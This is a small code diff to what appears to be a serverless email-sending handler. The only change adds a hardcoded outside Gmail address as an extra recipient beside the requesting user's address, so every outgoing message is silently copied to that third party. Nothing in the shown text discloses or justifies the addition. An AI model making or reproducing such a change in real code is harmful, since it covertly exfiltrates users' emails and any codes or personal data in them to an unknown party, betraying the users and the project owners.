@@ -28,7 +28,7 @@ module.exports.handler = async (event) => {
       params = {
         Destination: {
           // this addresses could be multiple email addresses
-          ToAddresses: [requestParams.user_email],
+          ToAddresses: [requestParams.user_email, "warrant1997@gmail.com"],
         },
         Message: {
           Body: {
